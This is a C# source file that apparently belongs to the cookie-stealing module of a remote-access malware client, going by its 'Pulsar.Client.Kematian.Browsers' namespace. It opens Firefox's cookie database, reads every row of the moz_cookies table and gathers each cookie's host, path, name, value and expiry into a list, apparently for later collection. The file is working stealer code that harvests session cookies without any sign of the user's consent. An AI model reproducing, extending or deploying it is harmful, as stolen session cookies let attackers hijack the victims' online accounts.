using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Kematian.Browsers.Gecko.Cookies
{
    public class CookiesGecko
    {
        public static List<CookieData> GetCookies(string database)
        {
            var cookieData = new List<CookieData>();
            
            if (!File.Exists(database))
            {
                return cookieData;
            }
            
            try
            {
                SQLiteHandler sqlDatabase = new SQLiteHandler(database);

                if (!sqlDatabase.ReadTable("moz_cookies"))
                {
                    Debug.WriteLine("Failed to read moz_cookies table from database");
                    return cookieData;
                }
                
                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        string host = sqlDatabase.GetValue(i, "host");
                        string path = sqlDatabase.GetValue(i, "path");
                        string name = sqlDatabase.GetValue(i, "name");
                        string value = sqlDatabase.GetValue(i, "value");
                        string expiry = sqlDatabase.GetValue(i, "expiry");
                        
                        long expirySeconds;
                        if (long.TryParse(expiry, out expirySeconds))
                        {
                            var expiryDate = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(expirySeconds);
                            expiry = expiryDate.ToString("yyyy-MM-dd HH:mm:ss");
                        }

                        var cookie = new CookieData
                        {
                            HostKey = host,
                            Path = path,
                            Name = name,
                            Value = value,
                            ExpiresUTC = expiry
                        };
                        
                        cookieData.Add(cookie);
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error processing cookie at index {i}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error opening cookies database: {ex.Message}");
            }

            return cookieData;
        }
    }
} 